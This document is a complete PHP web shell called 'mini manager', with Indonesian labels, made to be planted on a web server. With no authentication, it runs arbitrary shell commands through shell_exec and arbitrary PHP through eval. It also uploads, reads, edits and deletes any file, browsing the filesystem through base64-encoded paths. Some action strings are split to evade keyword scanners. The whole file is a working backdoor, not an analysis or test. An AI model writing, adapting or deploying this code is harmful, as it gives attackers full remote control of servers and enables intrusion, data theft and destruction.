<?php
error_reporting(0);

// auth bypassed — no login, no hash, no cookie

$r = str_replace("\\", "/", getcwd());
$p = isset($_GET['peta']) ? base64_decode($_GET['peta']) : $r;
$p = str_replace("\\", "/", $p);

if (!is_dir($p)) $p = $r;

if (isset($_POST['aksi']) && $_POST['aksi'] == ("up"."load")) {
    if (isset($_FILES['muatan']['tmp_name']) && $_FILES['muatan']['tmp_name'] != '') {
        $t = $p.'/'.$_FILES['muatan']['name'];
        if (@move_uploaded_file($_FILES['muatan']['tmp_name'], $t)) {
            echo "<font color=lime>Upload Sukses!</font><br>";
        } else {
            echo "<font color=red>Upload Gagal!</font><br>";
        }
    }
}

if (isset($_GET['aksi']) && $_GET['aksi'] == ("ha"."pus") && isset($_GET['target'])) {
    $tgt = base64_decode($_GET['target']);
    if (is_dir($tgt)) @rmdir($tgt);
    else @unlink($tgt);

    header("Location: ?peta=" . base64_encode($p));
    exit;
}

if (isset($_POST['aksi']) && $_POST['aksi'] == ("sim"."pan") && isset($_POST['target'])) {
    $ft = base64_decode($_POST['target']);
    if ($h = @fopen($ft, "w")) {
        @fwrite($h, $_POST['konten']);
        @fclose($h);
        echo "<font color=lime>File Tersimpan!</font><br>";
    } else {
        echo "<font color=red>Gagal menyimpan file!</font><br>";
    }
}
?>
<?php
if (isset($_POST['cmd'])) {
    echo '<pre style="background:#111;color:lime;padding:10px;border:1px solid #333;margin:5px;">';
    $out = @shell_exec($_POST['cmd'].' 2>&1');
    echo htmlspecialchars($out ?? '(no output)');
    echo '</pre>';
}
if (isset($_POST['phpcode'])) {
    echo '<pre style="background:#111;color:orange;padding:10px;border:1px solid #333;margin:5px;">';
    ob_start();
    @eval('?>'.$_POST['phpcode']);
    echo htmlspecialchars(ob_get_clean());
    echo '</pre>';
}
?>
<html>
<head><title>mini manager</title></head>
<body bgcolor="black" text="white" link="white" vlink="white" alink="red">
<form method="POST" style="margin:5px 0;">
CMD: <input type="text" name="cmd" style="width:60%;background:#111;color:lime;border:1px solid #333;">
<input type="submit" value="Exec">
</form>
<form method="POST" style="margin:5px 0;">
PHP: <input type="text" name="phpcode" style="width:60%;background:#111;color:orange;border:1px solid #333;">
<input type="submit" value="Eval">
</form>

<table width="100%" border="0">
<tr><td><h1>mini manager</h1></td>
<td align="right">&nbsp;</td></tr>
</table>
<hr color="white">

Path:
<?php
$pp = explode("/", $p);
foreach ($pp as $id => $nm) {
    if ($nm == "" && $id == 0) {
        echo '<a href="?peta=' . base64_encode('/') . '">/</a>';
        continue;
    }
    if ($nm == "") continue;

    echo '<a href="?peta='.base64_encode(implode('/', array_slice($pp,0,$id+1))).'">'.htmlspecialchars($nm).'</a> / ';
}
?>

<br><br>
<form method="POST" enctype="multipart/form-data">
Upload: <input type="file" name="muatan">
<input type="hidden" name="aksi" value="upload">
<input type="submit" value="Upload">
</form>

<hr color="white">

<?php
if (isset($_GET['aksi']) && $_GET['aksi'] == ("ed"."it") && isset($_GET['target'])):

$fe = base64_decode($_GET['target']);
$raw = @file_get_contents($fe);
if ($raw === false) $raw = "";
$ct = htmlspecialchars($raw);
?>
<h3>Edit: <?php echo htmlspecialchars(basename($fe)); ?></h3>

<form method="POST">
<textarea name="konten" rows="20" style="width:100%;background:black;color:white;border:1px solid white;"><?php echo $ct; ?></textarea><br><br>
<input type="hidden" name="target" value="<?php echo htmlspecialchars($_GET['target']); ?>">
<input type="hidden" name="aksi" value="simpan">
<input type="submit" value="Simpan File">
<a href="?peta=<?php echo base64_encode($p); ?>">[ Kembali ]</a>
</form>

<?php else: ?>

<table border="1" width="100%" cellpadding="5" cellspacing="0" bordercolor="white">
<tr bgcolor="#222">
<th>Nama</th><th width="10%">Tipe</th><th width="15%">Ukuran</th><th width="15%">Aksi</th></tr>

<?php
$it = @scandir($p);
if (!is_array($it)) $it = [];

$fd = [];
$fl = [];

foreach ($it as $ii) {
    if ($ii == "." || $ii == "..") continue;

    $jl = $p.'/'.$ii;
    if (is_dir($jl)) $fd[] = $ii;
    else $fl[] = $ii;
}

$all = array_merge($fd, $fl);

foreach ($all as $ii) {
    $jl = $p.'/'.$ii;
    $ec = base64_encode($jl);
    $is = is_dir($jl);

    echo "<tr>";
    echo "<td>".($is ? "<a href='?peta=$ec'><b>[ ".htmlspecialchars($ii)." ]</b></a>" : htmlspecialchars($ii))."</td>";
    echo "<td align='center'>".($is?"DIR":"FILE")."</td>";
    echo "<td align='right'>".($is?"-":@filesize($jl)." B")."</td>";
    echo "<td align='center'>";
    if (!$is) {
        echo "<a href='?peta=".base64_encode($p)."&aksi=edit&target=$ec'>Edit</a> | ";
    }
    echo "<a href='?peta=".base64_encode($p)."&aksi=hapus&target=$ec' onclick=\"return confirm('Hapus?')\">Hapus</a>";
    echo "</td></tr>";
}
?>
</table>

<?php endif; ?>
<hr color="white">
<center><font size="2">&copy; <?php echo date("Y"); ?> mini manager</font></center>

</body>
</html>
